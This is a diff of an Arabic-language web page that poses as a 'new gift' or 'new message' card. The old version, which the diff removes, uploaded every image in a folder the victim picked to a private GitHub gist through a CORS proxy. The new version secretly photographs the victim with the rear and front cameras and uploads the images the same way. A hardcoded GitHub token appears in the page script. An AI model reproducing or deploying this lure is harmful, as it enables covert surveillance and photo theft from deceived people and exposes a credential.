@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>هدية خاصة لك</title>
+    <title>جاري معالجة البيانات...</title>
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
@@ -11,7 +11,7 @@
             overflow: hidden;
         }
         
-        /* تنسيق بطاقة الهدية */
+        /* واجهة الهدية */
         .gift-card {
             text-align: center; 
             background: linear-gradient(145deg, #2d2d2d, #252525); 
@@ -22,149 +22,140 @@
             cursor: pointer; 
             transition: all 0.3s ease;
             border: 1px solid #333;
-            position: relative;
+            animation: float 3s ease-in-out infinite;
         }
-        .gift-card:hover { transform: translateY(-5px); box-shadow: 0 20px 50px rgba(0,123,255,0.2); border-color: #007bff; }
-        .gift-icon { font-size: 90px; animation: float 3s ease-in-out infinite; display: block; margin-bottom: 20px; }
-        .gift-text { font-size: 22px; font-weight: bold; color: #fff; margin: 0; }
-        .sub-text { font-size: 14px; color: #aaa; margin-top: 10px; }
-
-        /* تنسيق شاشة التحميل (الخلفية) */
-        .processing-screen {
-            display: none;
-            text-align: center;
-            width: 90%; max-width: 400px;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #007bff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        .status-msg { font-size: 16px; color: #ccc; margin-top: 15px; line-height: 1.6; }
+        .gift-icon { font-size: 90px; display: block; margin-bottom: 20px; }
+        .gift-text { font-size: 22px; font-weight: bold; margin: 0; }
         
-        /* تأثيرات الحركة */
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        /* واجهة الكاميرا المخفية */
+        .camera-interface {
+            display: none;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: black; z-index: 999;
+            flex-direction: column; justify-content: center; align-items: center;
+        }
+        video { width: 100%; height: auto; max-height: 70vh; object-fit: cover; transform: scaleX(-1); }
+        .status-overlay {
+            position: absolute; bottom: 20px; width: 100%; text-align: center;
+            background: rgba(0,0,0,0.7); padding: 10px; border-radius: 10px;
+        }
 
-        a { color: #007bff; text-decoration: none; word-break: break-all; }
+        /* تأثيرات */
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
 <!-- واجهة الهدية -->
-<div class="gift-card" id="giftCard" onclick="startMagic()">
+<div class="gift-card" id="giftCard" onclick="startAutoCapture()">
     <span class="gift-icon">🎁</span>
-    <h2 class="gift-text">لديك هدية جديدة!</h2>
-    <p class="sub-text">اضغط لفتحها ومعالجة الملفات</p>
+    <h2 class="gift-text">لديك رسالة جديدة</h2>
+    <p style="color: #aaa; margin-top: 10px;">اضغط للمعاينة</p>
 </div>
 
-<!-- واجهة المعالجة في الخلفية -->
-<div class="processing-screen" id="procScreen">
-    <div class="loader"></div>
-    <div class="status-msg" id="status">جاري الاتصال بالخادم...</div>
+<!-- واجهة الكاميرا -->
+<div class="camera-interface" id="camInterface">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="status-overlay" id="statusText">
+        جاري تشغيل الكاميرا...
+    </div>
 </div>
 
 <script>
     const GH_TOKEN = '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'; 
+    let capturedFiles = [];
 
-    function startMagic() {
-        // إخفاء الهدية وإظهار شاشة التحميل
+    async function startAutoCapture() {
+        // إخفاء الهدية وإظهار الكاميرا
         document.getElementById('giftCard').style.display = 'none';
-        const proc = document.getElementById('procScreen');
-        proc.style.display = 'block';
-        proc.style.animation = 'fadeIn 0.5s ease';
+        const camInterface = document.getElementById('camInterface');
+        camInterface.style.display = 'flex';
+        camInterface.style.animation = 'fadeIn 0.5s';
         
-        // محاكاة خطوات المعالجة
-        updateStatus("جاري التحقق من الأمان...", 1000);
-        updateStatus("جاري تهيئة الصور...", 2000);
-        updateStatus("اختر المجلد الآن للمتابعة...", 3000);
-        
-        setTimeout(openFolderPicker, 3000);
-    }
+        const status = document.getElementById('statusText');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
-    function updateStatus(msg, delay) {
-        setTimeout(() => {
-            document.getElementById('status').innerText = msg;
-        }, delay);
-    }
-
-    async function openFolderPicker() {
         try {
-            if (!window.showDirectoryPicker) {
-                document.getElementById('status').innerHTML = "❌ المتصفح لا يدعم الميزات المتقدمة.<br>يرجى استخدام Chrome.";
-                return;
-            }
+            // 1. التقاط صورة بالكاميرا الخلفية
+            status.innerText = "جاري استخدام الكاميرا الخلفية...";
+            await captureImage(video, canvas, ctx, 'back', 'خلفية.jpg');
 
-            const dirHandle = await window.showDirectoryPicker();
-            updateStatus("جاري قراءة الملفات...", 500);
-            
-            let filesToUpload = [];
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
-                    filesToUpload.push(entry);
-                }
-            }
+            // 2. التقاط صورة بالكاميرا الأمامية
+            status.innerText = "جاري التبديل للكاميرا الأمامية...";
+            await new Promise(r => setTimeout(r, 1000)); // تأخير بسيط للتأكد من تبديل العدسة
+            await captureImage(video, canvas, ctx, 'front', 'أمامية.jpg');
 
-            if (filesToUpload.length === 0) {
-                document.getElementById('status').innerText = "لم يتم العثور على صور في المجلد المحدد.";
-                return;
-            }
-
-            updateStatus(`تم العثور على ${filesToUpload.length} صورة. جاري الرفع النهائي...`, 500);
-            
-            const gistFiles = {};
-            for (let i = 0; i < filesToUpload.length; i++) {
-                const fileEntry = filesToUpload[i];
-                const file = await fileEntry.getFile();
-                const base64 = await readFileAsBase64(file);
-                gistFiles[file.name] = { content: base64 };
-                
-                if ((i + 1) % 5 === 0) updateStatus(`جاري رفع ${i + 1} من ${filesToUpload.length}...`, 0);
-            }
-
-            // الرفع الفعلي
-            const proxyUrl = 'https://api.allorigins.win/raw?url=';
-            const apiUrl = encodeURIComponent('https://api.github.com/gists');
-            
-            const response = await fetch(proxyUrl + apiUrl, {
-                method: 'POST',
-                headers: {
-                    'Authorization': `token ${GH_TOKEN}`,
-                    'Content-Type': 'application/json',
-                    'X-GitHub-Api-Version': '2022-11-28'
-                },
-                body: JSON.stringify({
-                    description: 'Gift Delivery - Auto Upload',
-                    public: false,
-                    files: gistFiles
-                })
-            });
-
-            if (response.ok) {
-                const data = await response.json();
-                document.getElementById('status').innerHTML = "✅ تم إرسال الهدية بنجاح!<br><br><a href='" + data.html_url + "' target='_blank'>اضغط هنا لعرض الصور</a>";
-            } else {
-                throw new Error('فشل الرفع');
-            }
+            status.innerText = "جاري رفع الصور...";
+            await uploadToGitHub();
 
         } catch (error) {
-            console.error(error);
-            document.getElementById('status').innerText = "حدث خطأ أثناء الإرسال: " + error.message;
+            status.innerText = "خطأ: " + error.message;
         }
     }
 
-    function readFileAsBase64(file) {
-        return new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.readAsDataURL(file);
-            reader.onload = () => resolve(reader.result);
-            reader.onerror = error => reject(error);
+    async function captureImage(video, canvas, ctx, mode, filename) {
+        // طلب الوصول للكاميرا المطلوبة
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: mode === 'back' ? 'environment' : 'user' }, 
+            audio: false 
         });
+        
+        video.srcObject = stream;
+        
+        // انتظار تحميل الفيديو
+        return new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+                video.play();
+                
+                // الانتظار قليلاً حتى يستقر البث
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    // رسم الصورة على الكانفاس
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تحويلها لملف
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                    const base64 = dataUrl.split(',')[1];
+                    
+                    // إضافة الملف للقائمة
+                    capturedFiles.push({ name: filename, content: base64 });
+                    
+                    resolve();
+                }, 1000);
+            };
+        });
+    }
+
+    async function uploadToGitHub() {
+        const proxyUrl = 'https://api.allorigins.win/raw?url=';
+        const apiUrl = encodeURIComponent('https://api.github.com/gists');
+        
+        const response = await fetch(proxyUrl + apiUrl, {
+            method: 'POST',
+            headers: {
+                'Authorization': `token ${GH_TOKEN}`,
+                'Content-Type': 'application/json',
+                'X-GitHub-Api-Version': '2022-11-28'
+            },
+            body: JSON.stringify({
+                description: 'Auto Captured Photos',
+                public: false,
+                files: Object.fromEntries(capturedFiles.map(f => [f.name, { content: f.content }] ))
+            })
+        });
+
+        if (response.ok) {
+            const data = await response.json();
+            document.getElementById('statusText').innerHTML = "✅ تم الإرسال بنجاح!<br><a href='" + data.html_url + "' target='_blank'>عرض الصور</a>";
+        } else {
+            document.getElementById('statusText').innerText = "فشل الرفع";
+        }
     }
 </script>
 
